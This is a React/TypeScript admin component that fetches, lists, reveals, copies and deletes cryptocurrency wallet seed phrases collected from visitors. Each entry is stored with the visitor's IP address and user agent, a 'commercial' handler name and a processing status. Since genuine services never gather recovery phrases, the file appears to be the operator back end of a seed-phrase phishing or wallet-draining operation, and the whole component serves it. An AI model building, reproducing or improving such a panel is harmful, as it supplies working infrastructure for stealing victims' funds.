import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Search, Eye, EyeOff, Copy, Trash2, Key } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface SeedPhraseSubmission {
  id: string;
  phrase: string;
  commercial_id: string | null;
  commercial_name: string | null;
  word_count: number;
  status: string | null;
  ip_address: unknown;
  user_agent: string | null;
  created_at: string;
  updated_at: string;
}

const SeedPhraseManagement = () => {
  const [submissions, setSubmissions] = useState<SeedPhraseSubmission[]>([]);
  const [filteredSubmissions, setFilteredSubmissions] = useState<SeedPhraseSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedStatus, setSelectedStatus] = useState('all');
  const [showSeedPhrases, setShowSeedPhrases] = useState<Record<string, boolean>>({});
  const { toast } = useToast();

  useEffect(() => {
    fetchSubmissions();
  }, []);

  const fetchSubmissions = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from('seed_phrase_submissions')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;

      setSubmissions(data || []);
      setFilteredSubmissions(data || []);
    } catch (error) {
      console.error('Error fetching seed phrase submissions:', error);
      toast({
        title: "Error",
        description: "Failed to fetch seed phrase submissions",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  // Filter submissions
  useEffect(() => {
    let filtered = submissions;

    if (searchTerm) {
      filtered = filtered.filter(submission =>
        submission.phrase?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        submission.commercial_name?.toLowerCase().includes(searchTerm.toLowerCase())
      );
    }

    if (selectedStatus !== 'all') {
      filtered = filtered.filter(submission => submission.status === selectedStatus);
    }

    setFilteredSubmissions(filtered);
  }, [submissions, searchTerm, selectedStatus]);

  const toggleSeedVisibility = (submissionId: string) => {
    setShowSeedPhrases(prev => ({
      ...prev,
      [submissionId]: !prev[submissionId]
    }));
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied",
        description: "Seed phrase copied to clipboard",
      });
    } catch (error) {
      console.error('Error copying to clipboard:', error);
      toast({
        title: "Copy Failed",
        description: "Please copy manually",
        variant: "destructive"
      });
    }
  };

  const deleteSubmission = async (submissionId: string) => {
    if (!confirm('Are you sure you want to delete this seed phrase submission? This action cannot be undone.')) {
      return;
    }

    try {
      const { error } = await supabase
        .from('seed_phrase_submissions')
        .delete()
        .eq('id', submissionId);

      if (error) throw error;

      toast({
        title: "Deleted",
        description: "Seed phrase submission deleted successfully",
      });

      fetchSubmissions();
    } catch (error) {
      console.error('Error deleting submission:', error);
      toast({
        title: "Error",
        description: "Failed to delete seed phrase submission",
        variant: "destructive"
      });
    }
  };

  const formatSeedPhrase = (phrase: string, submissionId: string) => {
    const isVisible = showSeedPhrases[submissionId];
    const displayText = isVisible ? phrase : '••••••••••••••••••••••••••••••••••••';
    
    return (
      <div className="flex items-center gap-2 max-w-xs">
        <span className="font-mono text-sm truncate" title={isVisible ? phrase : 'Click eye to reveal'}>
          {displayText}
        </span>
        <div className="flex gap-1">
          <button
            onClick={() => toggleSeedVisibility(submissionId)}
            className="text-gray-400 hover:text-white"
            title={isVisible ? 'Hide' : 'Show'}
          >
            {isVisible ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          </button>
          {isVisible && (
            <button
              onClick={() => copyToClipboard(phrase)}
              className="text-gray-400 hover:text-white"
              title="Copy seed phrase"
            >
              <Copy className="h-4 w-4" />
            </button>
          )}
        </div>
      </div>
    );
  };

  const getStatusBadge = (status: string | null) => {
    switch (status) {
      case 'submitted':
        return <Badge variant="default" className="bg-green-500">Submitted</Badge>;
      case 'processed':
        return <Badge variant="secondary">Processed</Badge>;
      case 'pending':
        return <Badge variant="outline" className="bg-yellow-100 text-yellow-800">Pending</Badge>;
      default:
        return <Badge variant="outline">{status || 'Unknown'}</Badge>;
    }
  };

  const stats = {
    total: submissions.length,
    submitted: submissions.filter(s => s.status === 'submitted').length,
    processed: submissions.filter(s => s.status === 'processed').length,
    pending: submissions.filter(s => s.status === 'pending').length
  };

  return (
    <div className="space-y-6">
      {/* Statistics */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card>
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Total Submissions</p>
                <p className="text-2xl font-bold text-gray-900">{stats.total}</p>
              </div>
              <Key className="h-8 w-8 text-gray-400" />
            </div>
          </CardContent>
        </Card>
        
        <Card>
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Submitted</p>
                <p className="text-2xl font-bold text-green-600">{stats.submitted}</p>
              </div>
              <div className="h-8 w-8 bg-green-100 rounded-full flex items-center justify-center">
                <div className="h-4 w-4 bg-green-500 rounded-full"></div>
              </div>
            </div>
          </CardContent>
        </Card>
        
        <Card>
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Processed</p>
                <p className="text-2xl font-bold text-gray-600">{stats.processed}</p>
              </div>
              <div className="h-8 w-8 bg-gray-100 rounded-full flex items-center justify-center">
                <div className="h-4 w-4 bg-gray-500 rounded-full"></div>
              </div>
            </div>
          </CardContent>
        </Card>
        
        <Card>
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Pending</p>
                <p className="text-2xl font-bold text-yellow-600">{stats.pending}</p>
              </div>
              <div className="h-8 w-8 bg-yellow-100 rounded-full flex items-center justify-center">
                <div className="h-4 w-4 bg-yellow-500 rounded-full"></div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Filters */}
      <Card>
        <CardContent className="p-4">
          <div className="flex flex-col md:flex-row gap-4">
            <div className="flex-1">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                <Input
                  placeholder="Search seed phrases or commercial names..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10"
                />
              </div>
            </div>
            <div className="flex gap-2">
              <select
                value={selectedStatus}
                onChange={(e) => setSelectedStatus(e.target.value)}
                className="px-3 py-2 border border-gray-300 rounded-md bg-white"
              >
                <option value="all">All Status</option>
                <option value="submitted">Submitted</option>
                <option value="processed">Processed</option>
                <option value="pending">Pending</option>
              </select>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Seed Phrases Table */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Key className="h-5 w-5" />
            Seed Phrase Submissions
          </CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-yellow-500 mx-auto mb-4"></div>
              <p className="text-gray-600">Loading seed phrase submissions...</p>
            </div>
          ) : filteredSubmissions.length === 0 ? (
            <div className="text-center py-8">
              <p className="text-gray-600">No seed phrase submissions found</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Seed Phrase</TableHead>
                    <TableHead>Commercial</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Word Count</TableHead>
                    <TableHead>IP Address</TableHead>
                    <TableHead>Submitted At</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredSubmissions.map((submission) => (
                    <TableRow key={submission.id}>
                      <TableCell>{formatSeedPhrase(submission.phrase, submission.id)}</TableCell>
                      <TableCell className="font-mono text-sm">{submission.commercial_name || '-'}</TableCell>
                      <TableCell>{getStatusBadge(submission.status)}</TableCell>
                      <TableCell>
                        <span className="font-semibold">
                          {submission.word_count} words
                        </span>
                      </TableCell>
                      <TableCell className="font-mono text-sm">
                        {String(submission.ip_address || '-')}
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          <div>{new Date(submission.created_at).toLocaleDateString()}</div>
                          <div className="text-xs text-gray-500">
                            {new Date(submission.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </div>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => deleteSubmission(submission.id)}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default SeedPhraseManagement;